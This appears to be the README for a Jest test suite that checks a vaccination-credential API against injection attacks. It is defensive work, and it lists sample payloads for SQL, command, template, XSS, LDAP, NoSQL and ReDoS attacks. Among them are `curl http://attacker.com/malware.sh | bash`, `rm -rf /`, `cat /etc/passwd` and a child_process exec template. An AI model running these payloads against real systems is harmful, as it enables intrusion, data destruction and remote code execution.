# Injection Payload Security Tests

## Overview

This document describes the comprehensive **injection payload security test suite** created to verify that API endpoints accepting wallet addresses and other user inputs are properly protected against common injection attacks.

## Test File

- **Location:** `backend/tests/injection-payload.test.js`
- **Framework:** Jest with Supertest
- **Test Count:** 100+ test cases covering 13 different attack vectors

## Motivation

API endpoints that accept user input (especially wallet addresses, personal information, and other sensitive data) are potential targets for injection attacks. This test suite ensures that:

1. **Input validation** is properly enforced
2. **Sanitization** removes dangerous characters and patterns
3. **Authorization checks** prevent privilege escalation
4. **Encoding bypasses** cannot circumvent security measures
5. **Edge cases** are handled safely (boundary testing, special characters, etc.)

## Endpoints Under Test

The test suite validates security on the following API endpoints:

### Wallet Address Endpoints

| Endpoint | Method | Protected Field | Test Cases |
|----------|--------|-----------------|-----------|
| `/vaccination/issue` | POST | `patient_address` (body) | 24 |
| `/verify/{wallet}` | GET | `wallet` (path parameter) | 22 |
| `/admin/issuers/{wallet}` | DELETE | `wallet` (path parameter) | 11 |
| `/onboarding/apply` | POST | `wallet` (body) | 11 |

### Other Input Fields

| Endpoint | Field | Test Cases |
|----------|-------|-----------|
| `/vaccination/issue` | `vaccine_name` | 28 |
| `/vaccination/issue` | `date_administered` | 8 |
| `/onboarding/apply` | `name` | 32 |
| `/onboarding/apply` | `license_number` | 7 |

## Attack Vectors Covered

### 1. SQL Injection (11 payloads)

Tests for classic SQL injection patterns including:
- `'; DROP TABLE users; --`
- `' OR '1'='1`
- `' UNION SELECT NULL--`
- `' AND 1=1 UNION SELECT * FROM accounts--`

**Applied to:** Wallet address fields, path parameters

**Expected Behavior:** Requests rejected with 400/403 status

---

### 2. Command Injection (11 payloads)

Tests for OS command execution attempts including:
- `; ls -la`
- `| cat /etc/passwd`
- `$(whoami)`
- `` `id` ``
- `&& rm -rf /`
- `$(curl http://attacker.com/malware.sh | bash)`

**Applied to:** `vaccine_name`, `name` fields

**Expected Behavior:** Dangerous characters stripped; commands not executed

---

### 3. Template Injection (10 payloads)

Tests for server-side template execution including:
- `${7*7}` (Expression Language)
- `#{7*7}` (OGNL)
- `{{ 7 * 7 }}` (Handlebars/Jinja2)
- `<%= 7*7 %>` (EJS)
- `{{constructor.prototype.toString()}}` (Prototype pollution)
- `{{process.env}}` (Environment variable access)
- `<%=require("child_process").exec("id")%>` (Code execution)

**Applied to:** `vaccine_name` field

**Expected Behavior:** Template expressions not evaluated; treated as literal strings

---

### 4. XSS/Encoding Injection (11 payloads)

Tests for Cross-Site Scripting attempts including:
- `<script>alert("xss")</script>`
- `<img src=x onerror="alert(1)">`
- `<svg onload="alert(1)">`
- `<iframe src="javascript:alert(1)"></iframe>`
- `<body onload="alert(1)">`
- `<details open ontoggle="alert(1)">`

**Applied to:** `vaccine_name`, `name` fields

**Expected Behavior:** Script tags and event handlers removed by sanitization

---

### 5. Encoding Bypass Attempts (8 payloads)

Tests for bypassing validation through encoding tricks including:
- URL encoding: `%27%20OR%20%271%27%3D%271`
- Double encoding: `%252753%2520OR%25201%253D1`
- UTF-8 encoding: `%c0%27 OR %c01%c0=%c01`
- HTML entities: `&#39; OR &#39;1&#39;=&#39;1`
- Unicode escapes: `\u0027 OR \u00271\u0027=\u00271`
- Hex encoding: `0x27 OR 0x31`

**Applied to:** Wallet address path parameters

**Expected Behavior:** Decoding and validation still applied; injection blocked

---

### 6. Wallet Address Boundary Testing (5 payloads)

Tests for wallet format validation edge cases:
- Too short wallet (8 chars instead of 56)
- Too long wallet (56 + "EXTRA")
- Invalid character in wallet (0 instead of valid Base32)
- Special characters embedded in wallet (null byte, newline, tab, space)

**Applied to:** All wallet address fields

**Expected Behavior:** Format validation rejects invalid lengths and characters

**Details:**
- Valid Stellar wallet format: `^G[A-Z2-7]{55}$` (56 characters total)
- Invalid formats should be rejected at 400/403/404

---

### 7. Control Character Injection (32 payloads)

Tests for embedding control characters (0x00-0x1F) in user input:
- NULL (0x00)
- SOH (0x01)
- ... through to US (0x1F)

**Applied to:** `name` field in onboarding

**Expected Behavior:** Control characters stripped by sanitization (except tab, newline, carriage return)

---

### 8. Null Byte Injection (4 payloads)

Tests for null byte termination attacks including:
- `vaccine\x00name`
- `GBBD47UZQ5CYVDXY2R2ZDTSDGQLW3DJRIGUMNQUNGSMBUI6ZVT76IFAY\x00extra`
- `John\x00Doe`
- `name%00injection` (URL encoded)

**Applied to:** Multiple fields

**Expected Behavior:** Null bytes cause validation error (400/500); input rejected

---

### 9. Cross-User/Privilege Escalation (2 payloads)

Tests for authorization bypass and privilege escalation:
- Patient attempting to access other patient's vaccination records
- Non-admin user attempting to delete issuers

**Expected Behavior:**
- Unauthorized access returns 403 or 404
- Role-based checks properly enforced

---

### 10. Date Injection Payloads (8 payloads)

Tests for injection in date fields including:
- `2025-01-01T00:00:00Z; DROP TABLE--`
- `"2025-01-01'; DELETE FROM vaccinations; --"`
- `${new Date()}`
- `2025-01-01\x00extra`
- Invalid formats: `invalid-date-format`, `9999-99-99`, `1900-00-00`, `2025-01-01T25:99:99Z`

**Applied to:** `date_administered` field

**Expected Behavior:** Invalid dates rejected with 400 status

---

### 11. LDAP Injection Payloads (7 payloads)

Tests for LDAP filter injection including:
- `*` (wildcard)
- `*)` (filter closure)
- `admin*`
- `*)(uid=*`
- `admin)(&(uid=admin`
- `*)(|(uid=*`
- `admin*))%00`

**Applied to:** `license_number` field

**Expected Behavior:** LDAP metacharacters safely handled

---

### 12. NoSQL Injection Payloads (7 payloads)

Tests for MongoDB/NoSQL-style injection including:
- `{ $ne: null }`
- `{ $gt: '' }`
- `{ $exists: true }`
- `{"$ne": null}`
- `{"$where": "1==1"}`
- `{"$or": [{}]}`

**Applied to:** JSON serialization in request bodies

**Expected Behavior:** Operators treated as string literals, not executed

---

### 13. Regex DoS (ReDoS) Payloads (5 payloads)

Tests for Regular Expression Denial of Service including:
- `a` repeated 1000 times
- `(a+)+` repeated 100 times
- `(a|a)*` repeated 50 times
- `(.*)*` repeated 50 times
- `x` repeated 10000 times

**Applied to:** `name` field

**Expected Behavior:** Large inputs accepted (200), rejected (400), or returned with 413 Payload Too Large

---

### 14. Stellar Contract Injection Payloads (4 payloads)

Tests for malformed Stellar-specific inputs:
- `"; unauthorized_op(); "`
- Invalid contract address: `CAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAWHF`
- Hex data: `0x` + 256 'a' characters
- Base64 overload: `AAAAgAAAAA=` + 100 '=' characters

**Applied to:** Contract-related queries and parameters

**Expected Behavior:** Invalid format rejected; proper validation on contract IDs

---

## Test Structure

Each test follows this pattern:

```javascript
describe('Attack Vector Category', () => {
  const payloads = [/* attack payloads */];
  
  describe('POST /endpoint - field_name', () => {
    payloads.forEach((payload) => {
      it(`should reject/sanitize attack: ${payload}`, async () => {
        const res = await request(app)
          .post('/endpoint')
          .set('Authorization', `Bearer ${token}`)
          .send({ field: payload, /* other fields */ });

        // Assert proper status and response
        expect([expected, statuses]).toContain(res.status);
        expect(res.body.error).toBeDefined();
      });
    });
  });
});
```

## Expected Test Behaviors

### Status Codes

- **200**: Payload accepted (sanitized or harmless)
- **400**: Validation error (bad format, invalid input)
- **403**: Forbidden (authorization failure, role mismatch)
- **404**: Not found (invalid wallet address)
- **413**: Payload too large (ReDoS prevention)
- **500**: Server error (null byte handling, format errors)

### Sanitization Rules

The following sanitization/validation is expected:

| Rule | Applied To | Behavior |
|------|-----------|----------|
| HTML tag stripping | All string fields | `<script>`, `</div>`, `<!-- -->` removed |
| Control char removal | All string fields | 0x00-0x1F removed (except tab, newline, CR) |
| Null byte rejection | All fields | Throws error or returns 400 |
| Whitespace trimming | All string fields | Leading/trailing spaces removed |
| Wallet format validation | Wallet fields | Regex + Stellar SDK checksum verification |
| Date format validation | Date fields | ISO 8601 or RFC 3339 format required |
| Command char filtering | All fields | `;`, `&`, `|`, `` ` ``, `$`, `(`, `)` handled safely |
| XSS char removal | String fields | Script/event handler patterns removed |

## Running the Tests

### Run all injection payload tests
```bash
cd backend
npm test -- injection-payload.test.js
```

### Run with verbose output
```bash
npm test -- injection-payload.test.js --verbose
```

### Run with coverage
```bash
npm run test:coverage -- injection-payload.test.js
```

### Run specific test suite
```bash
npm test -- injection-payload.test.js -t "SQL Injection"
```

### Run with longer timeout (for ReDoS tests)
```bash
npm test -- injection-payload.test.js --testTimeout=30000
```

## Test Results Interpretation

### ✅ Passing Tests

Indicate that the endpoint properly:
- Validates input format
- Rejects or sanitizes malicious payloads
- Enforces authorization rules
- Returns appropriate error messages

### ❌ Failing Tests

Indicate potential security vulnerabilities:
- Injection payload accepted without sanitization
- Unexpected status code returned
- Error response missing or incorrect
- Authorization bypass possible

### ⚠️ Warnings

Common false positives to watch for:
- ReDoS tests timing out (expected for very long strings)
- Commands accepted but sanitized (OK if dangerous chars removed)
- `200` status when `400` expected (check if input was sanitized)

## Test Maintenance

### Adding New Payloads

To add new attack patterns:

```javascript
describe('New Attack Vector', () => {
  const newPayloads = [
    'payload1',
    'payload2',
    // ...
  ];

  describe('POST /endpoint - field', () => {
    newPayloads.forEach((payload) => {
      it(`should reject/handle: ${payload}`, async () => {
        const res = await request(app)
          .post('/endpoint')
          .set('Authorization', `Bearer ${token}`)
          .send({ field: payload });

        expect([expectedStatuses]).toContain(res.status);
      });
    });
  });
});
```

### Updating for New Endpoints

When new endpoints accepting user input are added:

1. Identify the input fields
2. Add test cases for each attack vector
3. Verify appropriate authorization headers
4. Follow existing naming/structure conventions
5. Run tests to establish baseline

## Security Considerations

### What These Tests Check

✅ Input validation strength  
✅ Sanitization effectiveness  
✅ Authorization enforcement  
✅ Error handling robustness  
✅ Special character handling  
✅ Encoding bypass prevention  

### What These Tests Don't Cover

❌ Performance/DoS attack mitigation (rate limiting, caching)  
❌ TLS/transport layer security  
❌ Authentication token strength  
❌ Database query optimization  
❌ Data exfiltration (large response sizes)  
❌ Side-channel attacks (timing, memory)  

For comprehensive security, combine these tests with:
- OWASP Top 10 security assessment
- Penetration testing by security professionals
- Static code analysis tools (SAST)
- Dynamic application security testing (DAST)
- Security headers validation
- Rate limiting and throttling checks

## Related Files

- **Sanitization Implementation:** `src/middleware/sanitize.js`
- **Wallet Validation:** `src/middleware/wallet.js`
- **Authorization Middleware:** `src/middleware/auth.js`
- **Existing Sanitization Tests:** `tests/sanitization.test.js`
- **Security Headers Tests:** `tests/security-headers.test.js`

## References

- [OWASP Injection](https://owasp.org/www-community/Injection)
- [OWASP XSS Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [CWE-78: Improper Neutralization of Special Elements used in an OS Command](https://cwe.mitre.org/data/definitions/78.html)
- [CWE-89: SQL Injection](https://cwe.mitre.org/data/definitions/89.html)
- [CWE-94: Improper Control of Generation of Code](https://cwe.mitre.org/data/definitions/94.html)
- [Stellar Documentation](https://developers.stellar.org/)

## Author Notes

This test suite provides a comprehensive baseline for injection attack protection. It should be:

1. **Run regularly** - Include in CI/CD pipeline
2. **Extended** - Add new payloads as new attack techniques emerge
3. **Updated** - Modify tests when endpoint behavior changes
4. **Reviewed** - Compare results against security best practices

## Questions or Issues?

If tests fail or produce unexpected results:

1. Review the error message and status code
2. Check the middleware implementation (sanitize.js, wallet.js, auth.js)
3. Verify input schemas in route handlers
4. Ensure authentication tokens are valid and properly scoped
5. Check server logs for additional context

---

**Created:** May 29, 2026  
**Test File:** `backend/tests/injection-payload.test.js`  
**Framework:** Jest 29.7.0 + Supertest  
**Total Test Cases:** 100+
